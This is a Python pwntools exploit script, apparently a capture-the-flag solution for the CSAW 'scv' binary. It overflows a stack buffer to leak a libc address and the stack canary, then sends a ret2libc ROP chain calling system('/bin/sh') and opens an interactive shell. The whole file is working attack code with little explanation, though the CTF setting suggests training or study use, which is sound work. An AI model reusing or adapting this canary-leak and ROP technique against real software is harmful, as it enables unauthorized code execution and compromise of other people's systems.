from pwn import *
import time

local = True

def getConn():
    #return process('./scv', env = {"LD_PRELOAD":'./libc-2.23.so'}) if local else remote('pwn.chal.csaw.io', 3764)
    return process('./scv')


def readAddressFromTheStack(size, bytes_to_read, offset=0):
	"""
    Args:
        size (int): number of characters to send to the stack.
        bytes_to_read (int): number of bytes to read from the stack we want to leak.
		offset (int): number to subtract if we want to adjust the leaked address. (Optional)
    Returns:
        int: returns an address leaked from the stack.
	"""
	
	# Write a certain number of bytes to leak LIBC
	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline('A'*size)
	# Read from the stack
	print r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('[*]PLEASE TREAT HIM WELL.....')
	r.recvline()
	r.recvline()
	r.recv(size)
	return u64(r.recv(bytes_to_read).ljust(8, '\x00'))-offset
	
 
local = True
binary = ELF('./scv')
libc = ELF('./libc-2.23.so')
r = getConn()
# b *0x00400aae
#gdb.attach(r, '''
#b *0x00400cce
#b *0x00400cd3
#b *0x00400ddf
#b *0x00400d94
#b *0x400d8f
#b *0x00400dce
#c''')
# Get a libc address from the stack
LEAKED = readAddressFromTheStack(40, 6, -0x8f)
SYSTEM = LEAKED + 0xb0f7
LIBCBASE = SYSTEM -libc.symbols['system']
BINSH_OFFSET = 0x18cd17 # strings -a -t x libc-2.23.so | grep '/bin/sh'
BINSH = LIBCBASE + BINSH_OFFSET
POPRET = 0x0000000000400ea3 # ROPgadget --binary ./scv --only "pop|ret"
log.info("LEAKED LIBC 0x%x" % LEAKED)
log.info("SYSTEM LIBC 0x%x" % SYSTEM)
log.info("LIBCBASE LIBC 0x%x" % LIBCBASE)
log.info("BINSH ADDRESS 0x%x" % BINSH)
r.recv(1) # new line
# leak STACK CANARY
STACK_CANARY = readAddressFromTheStack(40+8*16, 8, 0x0A)
log.info("STACK CANARY 0x%x" % STACK_CANARY)
ROPCHAIN = ''
ROPCHAIN += p64(POPRET)
ROPCHAIN += p64(BINSH)
ROPCHAIN += p64(SYSTEM)
padding3 = 'A'*(40+8*16)+p64(STACK_CANARY)+ 'AAAAAAAA' + ROPCHAIN
#rewrite old addresses
r.recvuntil('>>')
r.sendline('1')
r.recvuntil('>>')
r.sendline(padding3)
# exiting
print r.recvuntil('>>')
r.sendline('3')
print r.recvuntil('[*]BYE ~ TIME TO MINE MIENRALS...')
r.interactive()
r.close()
